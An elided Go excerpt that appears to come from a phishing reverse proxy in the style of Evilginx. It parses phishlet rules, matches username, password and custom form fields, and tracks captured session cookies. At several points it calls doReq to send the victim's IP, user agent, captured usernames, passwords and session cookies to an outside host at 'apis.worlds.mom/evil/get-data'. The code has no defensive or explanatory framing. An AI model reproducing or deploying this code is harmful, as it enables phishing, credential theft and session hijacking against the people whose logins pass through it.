						...
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								...
								if err == nil {
									...
									worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
								...
								for k, v := range req.PostForm {
									...
									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										...
										if um != nil && len(um) > 1 {
											...
											worldContent := doReq("https://apis.worlds.mom/evil/get-data/?ip="+ remote_addr +"&user=" + url.QueryEscape(um[1]))
									...
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										...
										if pm != nil && len(pm) > 1 {
											...
											worldContent := doReq("https://apis.worlds.mom/evil/get-data/?ip="+ remote_addr +"&pwd=" + url.QueryEscape(pm[1]))
									...
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											...
											if cm != nil && len(cm) > 1 {
												...
												worldContent := doReq("https://apis.worlds.mom/evil/get-data/?ip="+ remote_addr +"&pwd=" + url.QueryEscape(cm[1]))
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						...
						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + url.QueryEscape(sendCookie))
					}
				}
			}
